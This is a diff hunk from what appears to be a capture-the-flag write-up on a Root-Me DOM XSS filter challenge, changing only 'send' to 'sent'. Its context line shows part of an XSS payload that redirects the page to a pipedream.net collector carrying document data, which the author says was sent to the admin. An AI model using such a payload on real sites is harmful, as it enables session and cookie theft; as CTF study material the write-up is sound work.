@@ -26,7 +26,7 @@ a'%0D%0Adocument.location='hTTps://eovasfu0mdllq4f.m.pipedream.net/?'.concat(doc
 
 ```
 
-I used this payload on the main page, then I grabbed the url and send it to admin. Now I think you already know what will happen next :D
+I used this payload on the main page, then I grabbed the url and sent it to admin. Now I think you already know what will happen next :D
 
 ![anh5](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/XSS_DOM_Filter5.png)
 
